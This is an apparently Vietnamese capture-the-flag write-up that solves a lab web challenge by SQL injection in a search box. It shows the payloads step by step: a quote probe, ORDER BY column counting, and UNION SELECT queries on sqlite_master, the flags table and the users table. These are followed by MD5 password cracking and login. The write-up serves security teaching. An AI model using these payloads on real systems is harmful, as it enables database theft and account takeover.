# Sql Map1

![image.png](Sql%20Map1/image.png)

![image.png](Sql%20Map1/image%201.png)

Sau khi tạo web và đăng nhập thì mọi người vào được bên trong web, web này có chức năng tìm kiếm 

![image.png](Sql%20Map1/image%202.png)

Ở đây mình nhập thử phần đầu flag nó ra khá nhiều flag giả, vì chức năng tìm kiếm kiểu này có thể sẽ có dùng `sql` để truy vấn nên mình sẽ thử xem có bị `sql injection` không, mình sẽ thêm dấu ngoặc đơn vào để kiểm tra xem 

```sql
academy'
```

![image.png](Sql%20Map1/image%203.png)

Tuyệt vời có vẻ như là nó đã bị lỗi sql injection, dựa và phản hồi lỗi chúng ta biết web sử dụng SQLite, để khai thác tiếp thì mình sẽ cần biết các bảng của cơ sở dữ liệu

Đầu tiên thì cần kiểm tra số cột của câu truy vấn bằng 

```sql
order by
```

![image.png](Sql%20Map1/image%204.png)

Ở đây mọi người nhìn mình nhập 2 thì vẫn thỏa mãn nhưng mà khi nhập 3 thì web bị lỗi 

![image.png](Sql%20Map1/image%205.png)

Vì vậy ta có thể xác định được số cột của truy vấn gốc là 2 giờ mình sẽ liệt kê các bảng 

```sql
' UNION SELECT name,1 FROM sqlite_master WHERE type='table'--
```

![image.png](Sql%20Map1/image%206.png)

Vậy là cơ sở dữ liệu này có 3 bảng: 

- **flags**
- **sqlite_sequence**
- **users**

Mình sẽ thử truy cập vào bảng flags xem có gì không nhé

```sql
abcd' UNION SELECT sql,1 FROM sqlite_master WHERE  type='table' AND name='flags'--
```

Lệnh này sẽ giúp mình xác định xem câu truy vấn tạo bảng là gì

![image.png](Sql%20Map1/image%207.png)

Bảng `flags` này có 3 cột lần lượt là `id,key,value`, mình sẽ liệt kê toàn bộ ra 

```sql
abcd' UNION SELECT id||':'|| key || ' : ' || value, 1 FROM flags--
```

![image.png](Sql%20Map1/image%208.png)

Ra rất nhiều `flags` nhưng mà toàn bộ đều là giả cả nên mình chuyển hướng sang bảng `users` xem có gì tiếp không 

```sql
abcd' UNION SELECT sql,1 FROM sqlite_master WHERE  type='table' AND name='users'--
```

![image.png](Sql%20Map1/image%209.png)

Mình sẽ lấy cột username và password của bảng này ra 

![image.png](Sql%20Map1/image%2010.png)

Có khá nhiều tài khoản và tất cả mất khẩu có vẻ như đều đã được mã hóa md5

![image.png](Sql%20Map1/image%2011.png)

Ở đây mình thử `crack md5 mật khẩu` của tài khoản `admin` nhưng mà không thành công, tiếp xuống `username thứ 2`  

![image.png](Sql%20Map1/image%2012.png)

Có ra được mật khẩu rồi mình sẽ thử đăng nhập xem có gì không 

![image.png](Sql%20Map1/image%2013.png)

Mình đã thành công lấy flag: 
academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}